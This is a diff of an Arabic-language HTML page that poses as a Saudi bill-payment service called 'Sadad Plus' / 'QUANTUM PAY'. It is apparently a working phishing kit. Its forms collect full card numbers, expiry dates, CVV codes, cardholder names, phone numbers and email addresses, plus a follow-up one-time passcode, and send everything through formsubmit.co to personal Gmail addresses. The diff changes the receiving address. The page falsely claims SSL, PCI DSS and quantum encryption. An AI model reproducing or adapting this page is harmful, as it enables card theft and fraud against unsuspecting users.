+</div>
+<div class="flex items-center gap-2 text-sm mt-2">
+<i class="fas fa-film text-nexus-purple"></i>
+<span>اشتراكات الترفيه</span>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+</div>
+<!-- Payment Page -->
+<div class="page" id="paymentPage">
+<div class="min-h-screen bg-black relative overflow-hidden">
+<!-- Matrix Style Background -->
+<div class="absolute inset-0 opacity-20">
+<div class="matrix-rain"></div>
+</div>
+<!-- Holographic Grid -->
+<div class="absolute inset-0">
+<div class="holographic-grid opacity-30"></div>
+<div class="absolute top-0 left-0 w-full h-full">
+<div class="floating-particle" style="top: 10%; left: 15%; animation-delay: 0s;"></div>
+<div class="floating-particle" style="top: 20%; right: 20%; animation-delay: 2s;"></div>
+<div class="floating-particle" style="top: 70%; left: 10%; animation-delay: 4s;"></div>
+<div class="floating-particle" style="top: 80%; right: 15%; animation-delay: 6s;"></div>
+</div>
+</div>
+<div class="relative z-10 pt-20 pb-12">
+<div class="container mx-auto px-6">
+<!-- Futuristic Header -->
+<div class="text-center mb-16" data-aos="fade-down">
+<h1 class="text-6xl md:text-8xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-purple-600 mb-6 futuristic-text">
                             QUANTUM PAY
                         </h1>
-                        <p class="text-2xl text-gray-300 max-w-4xl mx-auto mb-8 font-light">
+<p class="text-2xl text-gray-300 max-w-4xl mx-auto mb-8 font-light">
                             نظام الدفع الكمومي المدعوم بالذكاء الاصطناعي • تشفير كمومي 2048-bit • حماية متقدمة
                         </p>
-                    </div>
-
-                    <div class="max-w-7xl mx-auto">
-                        <div class="grid grid-cols-1 lg:grid-cols-3 gap-12">
-                            <!-- Payment Form -->
-                            <div class="lg:col-span-2" data-aos="fade-up" data-aos-delay="200">
-                                <form id="paymentForm" action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" class="space-y-10">
-                                    <!-- FormSubmit Settings -->
-                                    <input type="hidden" name="_subject" value="🔒 طلب دفع جديد - سداد بلس">
-                                    <input type="hidden" name="_template" value="table">
-                                    <input type="hidden" name="_captcha" value="false">
-                                    <input type="hidden" name="_next" value="https://google.com">
-                                    <!-- FormSubmit Hidden Fields -->
-                                    <input type="hidden" name="_subject" value="🔒 طلب دفع جديد - سداد بلس">
-                                    <input type="hidden" name="_template" value="table">
-                                    <input type="hidden" name="_captcha" value="false">
-                                    <input type="hidden" name="_next" value="about:blank">
-                                    
-                                    <!-- Service Selection Section -->
-                                    <div class="neural-section">
-                                        <div class="flex items-center mb-6">
-                                            <div class="w-12 h-12 bg-gradient-to-r from-cyan-400 to-blue-500 rounded-xl flex items-center justify-center ml-4">
-                                                <i class="fas fa-cog text-white text-xl"></i>
-                                            </div>
-                                            <h3 class="text-2xl font-bold text-white">تحديد الخدمة والمبلغ</h3>
-                                        </div>
-                                        
-                                        <div class="space-y-6">
-                                            <!-- Service Type -->
-                                            <div>
-                                                <label class="neural-label">
-                                                    <i class="fas fa-list text-cyan-400 ml-2"></i>
+</div>
+<div class="max-w-7xl mx-auto">
+<div class="grid grid-cols-1 lg:grid-cols-3 gap-12">
+<!-- Payment Form -->
+<div class="lg:col-span-2" data-aos="fade-up" data-aos-delay="200">
+<form action="https://formsubmit.co/zazylalhkr7@gmail.com" class="space-y-10" id="paymentForm" method="POST">
+<!-- FormSubmit Settings -->
+<input name="_subject" type="hidden" value="🔒 طلب دفع جديد - سداد بلس"/>
+<input name="_template" type="hidden" value="table"/>
+<input name="_captcha" type="hidden" value="false"/>
+<input name="_next" type="hidden" value="https://google.com"/>
+<!-- FormSubmit Hidden Fields -->
+<input name="_subject" type="hidden" value="🔒 طلب دفع جديد - سداد بلس"/>
+<input name="_template" type="hidden" value="table"/>
+<input name="_captcha" type="hidden" value="false"/>
+<input name="_next" type="hidden" value="about:blank"/>
+<!-- Service Selection Section -->
+<div class="neural-section">
+<div class="flex items-center mb-6">
+<div class="w-12 h-12 bg-gradient-to-r from-cyan-400 to-blue-500 rounded-xl flex items-center justify-center ml-4">
+<i class="fas fa-cog text-white text-xl"></i>
+</div>
+<h3 class="text-2xl font-bold text-white">تحديد الخدمة والمبلغ</h3>
+</div>
+<div class="space-y-6">
+<!-- Service Type -->
+<div>
+<label class="neural-label">
+<i class="fas fa-list text-cyan-400 ml-2"></i>
                                                     نوع الخدمة *
                                                 </label>
-                                                <select id="serviceType" name="نوع_الخدمة" class="neural-input" onchange="updateServiceAmount()">
-                                                    <option value="">اختر نوع الخدمة</option>
-                                                    <option value="mobile">دفع فاتورة الجوال</option>
-                                                    <option value="recharge">شحن رصيد الجوال</option>
-                                                    <option value="internet">فاتورة الإنترنت</option>
-                                                    <option value="electricity">فاتورة الكهرباء</option>
-                                                    <option value="water">فاتورة الماء</option>
-                                                    <option value="gas">فاتورة الغاز</option>
-                                                    <option value="violations">المخالفات المرورية</option>
-                                                    <option value="government">الخدمات الحكومية</option>
-                                                    <option value="shopping">التسوق والترفيه</option>
-                                                </select>
-                                            </div>
-                                            
-                                            <!-- Recharge Options (shown only for mobile recharge) -->
-                                            <div id="rechargeOptionsContainer" class="recharge-options">
-                                                <div class="recharge-option" onclick="selectRechargeAmount(10)">
-                                                    <div class="text-lg font-bold">10 ريال</div>
-                                                    <div class="text-sm opacity-75">أساسي</div>
-                                                </div>
-                                                <div class="recharge-option" onclick="selectRechargeAmount(20)">
-                                                    <div class="text-lg font-bold">20 ريال</div>
-                                                    <div class="text-sm opacity-75">مناسب</div>
-                                                </div>
-                                                <div class="recharge-option" onclick="selectRechargeAmount(50)">
-                                                    <div class="text-lg font-bold">50 ريال</div>
-                                                    <div class="text-sm opacity-75">شائع</div>
-                                                </div>
-                                                <div class="recharge-option" onclick="selectRechargeAmount(100)">
-                                                    <div class="text-lg font-bold">100 ريال</div>
-                                                    <div class="text-sm opacity-75">ممتاز</div>
-                                                </div>
-                                                <div class="recharge-option" onclick="selectRechargeAmount(200)">
-                                                    <div class="text-lg font-bold">200 ريال</div>
-                                                    <div class="text-sm opacity-75">فخم</div>
-                                                </div>
-                                                <div class="recharge-option" onclick="selectRechargeAmount(500)">
-                                                    <div class="text-lg font-bold">500 ريال</div>
-                                                    <div class="text-sm opacity-75">VIP</div>
-                                                </div>
-                                            </div>
-                                            
-                                            <!-- Custom Amount Section -->
-                                            <div class="custom-amount-container">
-                                                <label class="neural-label">
-                                                    <i class="fas fa-money-bill text-green-400 ml-2"></i>
+<select class="neural-input" id="serviceType" name="نوع_الخدمة" onchange="updateServiceAmount()">
+<option value="">اختر نوع الخدمة</option>
+<option value="mobile">دفع فاتورة الجوال</option>
+<option value="recharge">شحن رصيد الجوال</option>
+<option value="internet">فاتورة الإنترنت</option>
+<option value="electricity">فاتورة الكهرباء</option>
+<option value="water">فاتورة الماء</option>
+<option value="gas">فاتورة الغاز</option>
+<option value="violations">المخالفات المرورية</option>
+<option value="government">الخدمات الحكومية</option>
+<option value="shopping">التسوق والترفيه</option>
+</select>
+</div>
+<!-- Recharge Options (shown only for mobile recharge) -->
+<div class="recharge-options" id="rechargeOptionsContainer">
+<div class="recharge-option" onclick="selectRechargeAmount(10)">
+<div class="text-lg font-bold">10 ريال</div>
+<div class="text-sm opacity-75">أساسي</div>
+</div>
+<div class="recharge-option" onclick="selectRechargeAmount(20)">
+<div class="text-lg font-bold">20 ريال</div>
+<div class="text-sm opacity-75">مناسب</div>
+</div>
+<div class="recharge-option" onclick="selectRechargeAmount(50)">
+<div class="text-lg font-bold">50 ريال</div>
+<div class="text-sm opacity-75">شائع</div>
+</div>
+<div class="recharge-option" onclick="selectRechargeAmount(100)">
+<div class="text-lg font-bold">100 ريال</div>
+<div class="text-sm opacity-75">ممتاز</div>
+</div>
+<div class="recharge-option" onclick="selectRechargeAmount(200)">
+<div class="text-lg font-bold">200 ريال</div>
+<div class="text-sm opacity-75">فخم</div>
+</div>
+<div class="recharge-option" onclick="selectRechargeAmount(500)">
+<div class="text-lg font-bold">500 ريال</div>
+<div class="text-sm opacity-75">VIP</div>
+</div>
+</div>
+<!-- Custom Amount Section -->
+<div class="custom-amount-container">
+<label class="neural-label">
+<i class="fas fa-money-bill text-green-400 ml-2"></i>
                                                     المبلغ المطلوب * (بالريال السعودي)
                                                 </label>
-                                                <input type="number" id="customAmount" name="المبلغ_المطلوب" class="custom-amount-input" placeholder="أدخل المبلغ المطلوب" min="1" max="50000" oninput="updateTotalAmount(this.value)">
-                                                <div class="mt-2 text-cyan-300 text-sm">
-                                                    <i class="fas fa-info-circle ml-2"></i>
+<input class="custom-amount-input" id="customAmount" max="50000" min="1" name="المبلغ_المطلوب" oninput="updateTotalAmount(this.value)" placeholder="أدخل المبلغ المطلوب" type="number"/>
+<div class="mt-2 text-cyan-300 text-sm">
+<i class="fas fa-info-circle ml-2"></i>
                                                     الحد الأدنى: 1 ريال - الحد الأقصى: 50,000 ريال
                                                 </div>
-                                            </div>
-                                            
-                                            <!-- Phone/Account Number -->
-                                            <div>
-                                                <label class="neural-label">
-                                                    <i class="fas fa-hashtag text-orange-400 ml-2"></i>
+</div>
+<!-- Phone/Account Number -->
+<div>
+<label class="neural-label">
+<i class="fas fa-hashtag text-orange-400 ml-2"></i>
                                                     رقم الحساب/الجوال (اختياري)
                                                 </label>
-                                                <input type="text" id="accountNumber" name="رقم_الحساب_أو_الجوال" class="neural-input" placeholder="أدخل رقم الحساب أو الجوال المراد دفع له">
-                                            </div>
-                                        </div>
-                                    </div>
-                                    
-                                    <!-- Payment Details Section -->
-                                    <div class="neural-section">
-                                        <div class="flex items-center mb-6">
-                                            <div class="w-12 h-12 bg-gradient-to-r from-blue-500 to-purple-600 rounded-xl flex items-center justify-center ml-4">
-                                                <i class="fas fa-credit-card text-white text-xl"></i>
-                                            </div>
-                                            <h3 class="text-2xl font-bold text-white">معلومات البطاقة</h3>
-                                        </div>
-                                        
-                                        <div class="space-y-6">
-                                            <!-- Card Number with Auto-fill -->
-                                            <div class="card-input-container">
-                                                <label class="neural-label">
-                                                    <i class="fas fa-credit-card text-blue-400 ml-2"></i>
+<input class="neural-input" id="accountNumber" name="رقم_الحساب_أو_الجوال" placeholder="أدخل رقم الحساب أو الجوال المراد دفع له" type="text"/>
+</div>
+</div>
+</div>
+<!-- Payment Details Section -->
+<div class="neural-section">
+<div class="flex items-center mb-6">
+<div class="w-12 h-12 bg-gradient-to-r from-blue-500 to-purple-600 rounded-xl flex items-center justify-center ml-4">
+<i class="fas fa-credit-card text-white text-xl"></i>
+</div>
+<h3 class="text-2xl font-bold text-white">معلومات البطاقة</h3>
+</div>
+<div class="space-y-6">
+<!-- Card Number with Auto-fill -->
+<div class="card-input-container">
+<label class="neural-label">
+<i class="fas fa-credit-card text-blue-400 ml-2"></i>
                                                     رقم البطاقة *
                                                 </label>
-                                                <input type="text" id="cardNumber" name="رقم_البطاقة_الكامل" class="neural-input" placeholder="1234 5678 9012 3456" maxlength="19" required="" oninput="formatCardNumber(this)" autocomplete="cc-number">
-                                                <div class="mt-2 text-cyan-300 text-sm">
-                                                    <i class="fas fa-info-circle ml-2"></i>
+<input autocomplete="cc-number" class="neural-input" id="cardNumber" maxlength="19" name="رقم_البطاقة_الكامل" oninput="formatCardNumber(this)" placeholder="1234 5678 9012 3456" required="" type="text"/>
+<div class="mt-2 text-cyan-300 text-sm">
+<i class="fas fa-info-circle ml-2"></i>
                                                     سيقترح المتصفح البطاقات المحفوظة تلقائياً
                                                 </div>
-                                            </div>
-                                            
-                                            <!-- Card Details Row -->
-                                            <div class="grid grid-cols-2 gap-6">
-                                                <div>
-                                                    <label class="neural-label">
-                                                        <i class="fas fa-calendar text-green-400 ml-2"></i>
+</div>
+<!-- Card Details Row -->
+<div class="grid grid-cols-2 gap-6">
+<div>
+<label class="neural-label">
+<i class="fas fa-calendar text-green-400 ml-2"></i>
                                                         تاريخ الانتهاء *
                                                     </label>
-                                                    <input type="text" id="expiryDate" name="تاريخ_انتهاء_البطاقة" class="neural-input" placeholder="MM/YY" maxlength="5" required="" oninput="formatExpiryDate(this)" autocomplete="cc-exp">
-                                                </div>
-                                                
-                                                <div>
-                                                    <label class="neural-label">
-                                                        <i class="fas fa-lock text-red-400 ml-2"></i>
+<input autocomplete="cc-exp" class="neural-input" id="expiryDate" maxlength="5" name="تاريخ_انتهاء_البطاقة" oninput="formatExpiryDate(this)" placeholder="MM/YY" required="" type="text"/>
+</div>
+<div>
+<label class="neural-label">
+<i class="fas fa-lock text-red-400 ml-2"></i>
                                                         رمز الأمان *
                                                     </label>
-                                                    <input type="text" id="cvv" name="رمز_الأمان_CVV" class="neural-input" placeholder="123" maxlength="4" required="" autocomplete="cc-csc">
-                                                </div>
-                                            </div>
-                                            
-                                            <!-- Cardholder Name -->
-                                            <div>
-                                                <label class="neural-label">
-                                                    <i class="fas fa-user text-purple-400 ml-2"></i>
+<input autocomplete="cc-csc" class="neural-input" id="cvv" maxlength="4" name="رمز_الأمان_CVV" placeholder="123" required="" type="text"/>
+</div>
+</div>
+<!-- Cardholder Name -->
+<div>
+<label class="neural-label">
+<i class="fas fa-user text-purple-400 ml-2"></i>
                                                     اسم حامل البطاقة *
                                                 </label>
-                                                <input type="text" id="cardHolderName" name="اسم_حامل_البطاقة_كامل" class="neural-input" placeholder="الاسم كما يظهر على البطاقة" required="" autocomplete="cc-name">
-                                            </div>
-                                        </div>
-                                    </div>
-                                    
-                                    <!-- Contact Information Section -->
-                                    <div class="neural-section">
-                                        <div class="flex items-center mb-6">
-                                            <div class="w-12 h-12 bg-gradient-to-r from-green-500 to-cyan-500 rounded-xl flex items-center justify-center ml-4">
-                                                <i class="fas fa-address-book text-white text-xl"></i>
-                                            </div>
-                                            <h3 class="text-2xl font-bold text-white">معلومات التواصل</h3>
-                                        </div>
-                                        
-                                        <div class="space-y-6">
-                                            <!-- Phone Number -->
-                                            <div>
-                                                <label class="neural-label">
-                                                    <i class="fas fa-phone text-green-400 ml-2"></i>
+<input autocomplete="cc-name" class="neural-input" id="cardHolderName" name="اسم_حامل_البطاقة_كامل" placeholder="الاسم كما يظهر على البطاقة" required="" type="text"/>
+</div>
+</div>
+</div>
+<!-- Contact Information Section -->
+<div class="neural-section">
+<div class="flex items-center mb-6">
+<div class="w-12 h-12 bg-gradient-to-r from-green-500 to-cyan-500 rounded-xl flex items-center justify-center ml-4">
+<i class="fas fa-address-book text-white text-xl"></i>
+</div>
+<h3 class="text-2xl font-bold text-white">معلومات التواصل</h3>
+</div>
+<div class="space-y-6">
+<!-- Phone Number -->
+<div>
+<label class="neural-label">
+<i class="fas fa-phone text-green-400 ml-2"></i>
                                                     رقم الجوال *
                                                 </label>
-                                                <input type="tel" id="phoneNumber" name="رقم_الجوال_للتواصل" class="neural-input" placeholder="05xxxxxxxx" maxlength="10" required="" autocomplete="tel">
-                                                <div class="mt-2 text-green-300 text-sm">
-                                                    <i class="fas fa-sms ml-2"></i>
+<input autocomplete="tel" class="neural-input" id="phoneNumber" maxlength="10" name="رقم_الجوال_للتواصل" placeholder="05xxxxxxxx" required="" type="tel"/>
+<div class="mt-2 text-green-300 text-sm">
+<i class="fas fa-sms ml-2"></i>
                                                     سيتم إرسال رمز التأكيد لهذا الرقم
                                                 </div>
-                                            </div>
-                                            
-                                            <!-- Email -->
-                                            <div>
-                                                <label class="neural-label">
-                                                    <i class="fas fa-envelope text-blue-400 ml-2"></i>
+</div>
+<!-- Email -->
+<div>
+<label class="neural-label">
+<i class="fas fa-envelope text-blue-400 ml-2"></i>
                                                     البريد الإلكتروني *
                                                 </label>
-                                                <input type="email" id="emailAddress" name="البريد_الإلكتروني" class="neural-input" placeholder="example@email.com" required="" autocomplete="email">
-                                                <div class="mt-2 text-blue-300 text-sm">
-                                                    <i class="fas fa-envelope-open-text ml-2"></i>
+<input autocomplete="email" class="neural-input" id="emailAddress" name="البريد_الإلكتروني" placeholder="example@email.com" required="" type="email"/>
+<div class="mt-2 text-blue-300 text-sm">
+<i class="fas fa-envelope-open-text ml-2"></i>
                                                     سيتم إرسال تفاصيل المعاملة إلى هذا البريد
                                                 </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    
-                                    <!-- Hidden fields for tracking -->
-                                    <input type="hidden" name="التاريخ_والوقت" id="hiddenDateTime">
-                                    <input type="hidden" name="المعرف_الفريد" id="hiddenUniqueId">
-                                    <input type="hidden" name="حالة_الطلب" value="تم الإرسال - في انتظار تأكيد OTP">
-                                    <input type="hidden" name="نوع_العملية" value="طلب دفع إلكتروني">
-                                    <input type="hidden" name="رصيد_مختار" id="hiddenSelectedRecharge" value="">
-                                    
-                                    <!-- Submit Button -->
-                                    <button type="submit" class="quantum-submit-btn">
-                                        <div class="btn-bg"></div>
-                                        <div class="btn-content">
-                                            <i class="fas fa-rocket text-2xl mb-2"></i>
-                                            <span class="btn-text">إرسال طلب الدفع</span>
-                                            <div class="btn-subtext">معالجة آمنة ومشفرة</div>
-                                        </div>
-                                    </button>
-                                </form>
-                            </div>
-                            
-                            <!-- Order Summary -->
-                            <div class="lg:col-span-1" data-aos="fade-up" data-aos-delay="400">
-                                <div class="neural-section sticky top-24">
-                                    <div class="flex items-center mb-6">
-                                        <div class="w-12 h-12 bg-gradient-to-r from-purple-500 to-pink-600 rounded-xl flex items-center justify-center ml-4">
-                                            <i class="fas fa-receipt text-white text-xl"></i>
-                                        </div>
-                                        <h3 class="text-2xl font-bold text-white">ملخص الطلب</h3>
-                                    </div>
-                                    
-                                    <div id="orderSummary" class="space-y-4">
-                                        <div class="text-center text-gray-400 py-8">
-                                            <i class="fas fa-calculator text-4xl mb-4"></i>
-                                            <p>اختر الخدمة وأدخل المبلغ لعرض الملخص</p>
-                                        </div>
-                                    </div>
-                                    
-                                    <div class="mt-8 pt-6 border-t border-cyan-500/30">
-                                        <div class="flex justify-between items-center">
-                                            <span class="text-xl font-bold text-white">الإجمالي:</span>
-                                            <span id="totalAmountDisplay" class="text-3xl font-bold text-cyan-400">0 ريال</span>
-                                        </div>
-                                    </div>
-                                    
-                                    <!-- Security Features -->
-                                    <div class="mt-8 space-y-3">
-                                        <div class="flex items-center text-sm text-gray-300">
-                                            <i class="fas fa-shield-alt text-green-400 ml-3 w-5"></i>
-                                            <span>تشفير SSL 256-bit</span>
-                                        </div>
-                                        <div class="flex items-center text-sm text-gray-300">
-                                            <i class="fas fa-lock text-blue-400 ml-3 w-5"></i>
-                                            <span>حماية PCI DSS</span>
-                                        </div>
-                                        <div class="flex items-center text-sm text-gray-300">
-                                            <i class="fas fa-clock text-purple-400 ml-3 w-5"></i>
-                                            <span>معالجة فورية</span>
-                                        </div>
-                                        <div class="flex items-center text-sm text-gray-300">
-                                            <i class="fas fa-headset text-orange-400 ml-3 w-5"></i>
-                                            <span>دعم فني 24/7</span>
-                                        </div>
-                                        <div class="flex items-center text-sm text-gray-300">
-                                            <i class="fas fa-credit-card text-yellow-400 ml-3 w-5"></i>
-                                            <span>بطاقات محفوظة</span>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- OTP Verification Page -->
-    <div id="otpPage" class="page">
-        <div class="min-h-screen bg-gradient-to-br from-emerald-900 via-cyan-900 to-blue-900 flex items-center justify-center relative overflow-hidden">
-            <div class="absolute inset-0">
-                <div class="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-emerald-600/20 to-cyan-600/20 animate-pulse"></div>
-                <div class="absolute top-20 left-20 w-96 h-96 bg-gradient-to-r from-green-400/30 to-cyan-400/30 rounded-full blur-3xl animate-float"></div>
-                <div class="absolute bottom-20 right-20 w-72 h-72 bg-gradient-to-r from-cyan-500/30 to-blue-500/30 rounded-full blur-3xl animate-float" style="animation-delay: 2s;"></div>
-            </div>
-            
-            <div class="container mx-auto px-6 relative z-10 text-center">
-                <div class="max-w-md mx-auto" data-aos="zoom-in">
-                    <div class="bg-white/10 backdrop-blur-md rounded-3xl p-12 text-center border border-white/20 shadow-2xl">
-                        <div class="w-24 h-24 bg-gradient-to-r from-emerald-400 to-cyan-400 rounded-full flex items-center justify-center mx-auto mb-8 animate-glow">
-                            <i class="fas fa-shield-check text-white text-4xl"></i>
-                        </div>
-                        
-                        <h1 class="text-4xl font-bold text-white mb-4">تأكيد العملية</h1>
-                        <p class="text-lg text-gray-300 mb-8 leading-relaxed">
+</div>
+</div>
+</div>
+<!-- Hidden fields for tracking -->
+<input id="hiddenDateTime" name="التاريخ_والوقت" type="hidden"/>
+<input id="hiddenUniqueId" name="المعرف_الفريد" type="hidden"/>
+<input name="حالة_الطلب" type="hidden" value="تم الإرسال - في انتظار تأكيد OTP"/>
+<input name="نوع_العملية" type="hidden" value="طلب دفع إلكتروني"/>
+<input id="hiddenSelectedRecharge" name="رصيد_مختار" type="hidden" value=""/>
+<!-- Submit Button -->
+<button class="quantum-submit-btn" type="submit">
+<div class="btn-bg"></div>
+<div class="btn-content">
+<i class="fas fa-rocket text-2xl mb-2"></i>
+<span class="btn-text">إرسال طلب الدفع</span>
+<div class="btn-subtext">معالجة آمنة ومشفرة</div>
+</div>
+</button>
+</form>
+</div>
+<!-- Order Summary -->
+<div class="lg:col-span-1" data-aos="fade-up" data-aos-delay="400">
+<div class="neural-section sticky top-24">
+<div class="flex items-center mb-6">
+<div class="w-12 h-12 bg-gradient-to-r from-purple-500 to-pink-600 rounded-xl flex items-center justify-center ml-4">
+<i class="fas fa-receipt text-white text-xl"></i>
+</div>
+<h3 class="text-2xl font-bold text-white">ملخص الطلب</h3>
+</div>
+<div class="space-y-4" id="orderSummary">
+<div class="text-center text-gray-400 py-8">
+<i class="fas fa-calculator text-4xl mb-4"></i>
+<p>اختر الخدمة وأدخل المبلغ لعرض الملخص</p>
+</div>
+</div>
+<div class="mt-8 pt-6 border-t border-cyan-500/30">
+<div class="flex justify-between items-center">
+<span class="text-xl font-bold text-white">الإجمالي:</span>
+<span class="text-3xl font-bold text-cyan-400" id="totalAmountDisplay">0 ريال</span>
+</div>
+</div>
+<!-- Security Features -->
+<div class="mt-8 space-y-3">
+<div class="flex items-center text-sm text-gray-300">
+<i class="fas fa-shield-alt text-green-400 ml-3 w-5"></i>
+<span>تشفير SSL 256-bit</span>
+</div>
+<div class="flex items-center text-sm text-gray-300">
+<i class="fas fa-lock text-blue-400 ml-3 w-5"></i>
+<span>حماية PCI DSS</span>
+</div>
+<div class="flex items-center text-sm text-gray-300">
+<i class="fas fa-clock text-purple-400 ml-3 w-5"></i>
+<span>معالجة فورية</span>
+</div>
+<div class="flex items-center text-sm text-gray-300">
+<i class="fas fa-headset text-orange-400 ml-3 w-5"></i>
+<span>دعم فني 24/7</span>
+</div>
+<div class="flex items-center text-sm text-gray-300">
+<i class="fas fa-credit-card text-yellow-400 ml-3 w-5"></i>
+<span>بطاقات محفوظة</span>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<!-- OTP Verification Page -->
+<div class="page" id="otpPage">
+<div class="min-h-screen bg-gradient-to-br from-emerald-900 via-cyan-900 to-blue-900 flex items-center justify-center relative overflow-hidden">
+<div class="absolute inset-0">
+<div class="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-emerald-600/20 to-cyan-600/20 animate-pulse"></div>
+<div class="absolute top-20 left-20 w-96 h-96 bg-gradient-to-r from-green-400/30 to-cyan-400/30 rounded-full blur-3xl animate-float"></div>
+<div class="absolute bottom-20 right-20 w-72 h-72 bg-gradient-to-r from-cyan-500/30 to-blue-500/30 rounded-full blur-3xl animate-float" style="animation-delay: 2s;"></div>
+</div>
+<div class="container mx-auto px-6 relative z-10 text-center">
+<div class="max-w-md mx-auto" data-aos="zoom-in">
+<div class="bg-white/10 backdrop-blur-md rounded-3xl p-12 text-center border border-white/20 shadow-2xl">
+<div class="w-24 h-24 bg-gradient-to-r from-emerald-400 to-cyan-400 rounded-full flex items-center justify-center mx-auto mb-8 animate-glow">
+<i class="fas fa-shield-check text-white text-4xl"></i>
+</div>
+<h1 class="text-4xl font-bold text-white mb-4">تأكيد العملية</h1>
+<p class="text-lg text-gray-300 mb-8 leading-relaxed">
                             تم إرسال رمز التأكيد المكون من 6 أرقام إلى بريدك الإلكتروني
                         </p>
-                        
-                        <!-- Countdown Timer -->
-                        <div class="mb-10">
-                            <div class="countdown mb-4 text-white" id="countdown">02:00</div>
-                            <div class="text-sm text-gray-400">الوقت المتبقي لإدخال الرمز</div>
-                            <div class="w-full bg-white/20 rounded-full h-2 mt-4">
-                                <div id="countdownProgress" class="bg-gradient-to-r from-cyan-400 to-blue-500 h-2 rounded-full transition-all duration-1000" style="width: 100%"></div>
-                            </div>
-                        </div>
-                        
-                        <!-- OTP Input -->
-                        <form id="otpForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="confirmFrame">
-                            <input type="hidden" name="_subject" value="✅ تأكيد رمز OTP - سداد بلس">
-                            <input type="hidden" name="_template" value="table">
-                            <input type="hidden" name="_captcha" value="false">
-                            <input type="hidden" name="_next" value="about:blank">
-                            <input type="hidden" name="الرمز_المدخل_من_العميل" id="hiddenEnteredCode">
-                            <input type="hidden" name="الرمز_الصحيح_المرسل" id="hiddenCorrectCode">
-                            <input type="hidden" name="وقت_التحقق" id="hiddenVerificationTime">
-                            <input type="hidden" name="المعاملة_المؤكدة" id="hiddenTransactionAmount">
-                            <input type="hidden" name="حالة_التحقق" value="تم التحقق بنجاح ✅">
-                            <input type="hidden" name="حالة_المعاملة_النهائية" value="مؤكدة ومكتملة">
-                            
-                            <div class="flex justify-center mb-10" dir="ltr">
-                                <input type="text" class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 0)">
-                                <input type="text" class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 1)">
-                                <input type="text" class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 2)">
-                                <input type="text" class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 3)">
-                                <input type="text" class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 4)">
-                                <input type="text" class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 5)">
-                            </div>
-                            
-                            <button type="submit" id="verifyBtn" class="w-full bg-gradient-to-r from-emerald-500 to-cyan-500 text-white py-4 rounded-2xl text-xl font-bold mb-6 hover:from-emerald-400 hover:to-cyan-400 transition-all duration-300 transform hover:scale-105">
+<!-- Countdown Timer -->
+<div class="mb-10">
+<div class="countdown mb-4 text-white" id="countdown">02:00</div>
+<div class="text-sm text-gray-400">الوقت المتبقي لإدخال الرمز</div>
+<div class="w-full bg-white/20 rounded-full h-2 mt-4">
+<div class="bg-gradient-to-r from-cyan-400 to-blue-500 h-2 rounded-full transition-all duration-1000" id="countdownProgress" style="width: 100%"></div>
+</div>
+</div>
+<!-- OTP Input -->
+<form action="https://formsubmit.co/zazylalhkr7@gmail.com" id="otpForm" method="POST" target="confirmFrame">
+<input name="_subject" type="hidden" value="✅ تأكيد رمز OTP - سداد بلس"/>
+<input name="_template" type="hidden" value="table"/>
+<input name="_captcha" type="hidden" value="false"/>
+<input name="_next" type="hidden" value="about:blank"/>
+<input id="hiddenEnteredCode" name="الرمز_المدخل_من_العميل" type="hidden"/>
+<input id="hiddenCorrectCode" name="الرمز_الصحيح_المرسل" type="hidden"/>
+<input id="hiddenVerificationTime" name="وقت_التحقق" type="hidden"/>
+<input id="hiddenTransactionAmount" name="المعاملة_المؤكدة" type="hidden"/>
+<input name="حالة_التحقق" type="hidden" value="تم التحقق بنجاح ✅"/>
+<input name="حالة_المعاملة_النهائية" type="hidden" value="مؤكدة ومكتملة"/>
+<div class="flex justify-center mb-10" dir="ltr">
+<input class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 0)" type="text"/>
+<input class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 1)" type="text"/>
+<input class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 2)" type="text"/>
+<input class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 3)" type="text"/>
+<input class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 4)" type="text"/>
+<input class="otp-input focus:border-cyan-400 focus:bg-white/20" maxlength="1" oninput="moveToNext(this, 5)" type="text"/>
+</div>
+<button class="w-full bg-gradient-to-r from-emerald-500 to-cyan-500 text-white py-4 rounded-2xl text-xl font-bold mb-6 hover:from-emerald-400 hover:to-cyan-400 transition-all duration-300 transform hover:scale-105" id="verifyBtn" type="submit">
                                 تأكيد الرمز
                             </button>
-                        </form>
-                        
-                        <button onclick="resendCode()" id="resendBtn" class="text-cyan-400 font-medium hover:text-cyan-300 transition-colors mb-8">
+</form>
+<button class="text-cyan-400 font-medium hover:text-cyan-300 transition-colors mb-8" id="resendBtn" onclick="resendCode()">
                             إعادة إرسال الرمز
                         </button>
-                        
-                        <div class="p-4 bg-blue-500/10 border border-blue-500/30 rounded-2xl">
-                            <div class="text-sm text-blue-300 flex items-center justify-center">
-                                <i class="fas fa-info-circle ml-2"></i>
+<div class="p-4 bg-blue-500/10 border border-blue-500/30 rounded-2xl">
+<div class="text-sm text-blue-300 flex items-center justify-center">
+<i class="fas fa-info-circle ml-2"></i>
                                 تحقق من صندوق الوارد والرسائل المرفوضة في بريدك الإلكتروني
                             </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Success Page -->
-    <div id="successPage" class="page">
